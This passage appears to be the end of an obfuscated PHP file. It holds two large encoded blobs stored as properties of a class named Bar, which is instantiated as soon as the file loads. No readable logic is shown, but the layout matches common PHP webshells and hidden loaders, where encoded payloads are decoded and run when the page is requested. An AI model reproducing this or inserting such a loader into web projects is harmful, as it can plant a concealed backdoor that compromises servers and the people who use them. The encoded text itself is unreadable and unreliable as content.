	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';
	 
	var $conf = 'bVLvT9swEP1cJP6Hw4pwIkVtI1iLlB9fUCYmpJW13b4UVKWJq3pN7Myx6SLo/75zYGwtfLu7d/f87p0d
	s4EYKA3Befy1wnCdlQ0LT0+cn9sdpmRJoA+NWTVauc0mC1xnOUunP9Lpgt7M53fLm8lsTh88H4Y+XHg4
	yNcubxqmsXGafvuezuYLuqwz7PHg6fSk13O6Jw8pjzo7tmBk6Xp7YKjoP9bryeT2S7qwAo84D7GwA162
	0sqwjqzTd8aqWrcuDuG8YtooAZlSWVfyga7GwfAipz5YHr9zxkph+UYCjVayaEGKXArNfuuKCROTV5LO
	PJJETa54rZNC5gZx3d8prlkpXHI5vISvUsNnaURBvPCtQ4otawu5E/YERuSaS+Ey3I6vwWX9XKvylrVw
	fm4zbL2WBYM4jmE0hudnOKxdjT6ofXpfC4LxPwNeDr8Pd1ygDhSUlzzffiTn7E3P3+EQ3q16T6O1VBVk
	3WxMCFRMb2QRk1o2Gj3iojYadFuzmFgjCYiswhh/wBGKX6XiiD9mpcE0SRAfWPLknnrhPhq82h0N7GkS
	Gv4B';
}

new Bar();
?>